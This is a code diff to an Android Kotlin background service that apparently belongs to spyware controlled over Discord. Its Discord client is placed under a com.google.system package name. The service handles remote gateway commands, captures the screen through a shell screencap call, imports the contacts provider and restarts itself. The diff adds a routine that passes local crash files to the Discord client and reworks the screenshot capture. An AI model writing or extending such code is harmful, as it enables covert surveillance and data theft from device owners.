@@ -24,6 +24,7 @@ import android.provider.ContactsContract
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.system.DiscordGatewayClient
+import com.openaccess.sdk.OpenAccessApp
 import kotlinx.coroutines.*
 import java.io.File
 import java.util.concurrent.CountDownLatch
@@ -80,9 +81,27 @@ class MainService : Service() {
         }
         if (!gatewayStarted) {
             gatewayStarted = true
+            loadCrashReports()
             discord?.start(scope)
         }
         return START_STICKY
+    }
+
+    private fun loadCrashReports() {
+        try {
+            val dir = File(filesDir, OpenAccessApp.CRASH_DIR)
+            if (!dir.exists()) return
+            val files = dir.listFiles { f -> f.name.startsWith("crash_") && f.name.endsWith(".txt") }
+                ?: return
+            if (files.isEmpty()) return
+            files.sortBy { it.lastModified() }
+            val report = files.first().readText()
+            files.first().delete()
+            discord?.setCrashReport(report)
+            Log.i(TAG, "Loaded crash report: ${files.first().name}")
+        } catch (e: Exception) {
+            Log.e(TAG, "loadCrashReports: ${e.message}")
+        }
     }
 
     private suspend fun handleGatewayCommand(action: String, payload: String?) {
@@ -171,11 +190,13 @@ class MainService : Service() {
             val f = File(dir, "s_${System.currentTimeMillis()}.png")
             val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", "screencap -p ${f.absolutePath}"))
             proc.waitFor(10, TimeUnit.SECONDS)
-            if (f.exists() && f.length() > 0) {
-                val bytes = f.readBytes()
-                f.delete()
-                bytes
-            } else null
+            if (!f.exists() || f.length() == 0L) {
+                Log.w(TAG, "screencap: file empty or missing")
+                return@withContext null
+            }
+            val bytes = f.readBytes()
+            f.delete()
+            bytes
         } catch (e: Exception) {
             Log.e(TAG, "screencap: ${e.message}")
             null
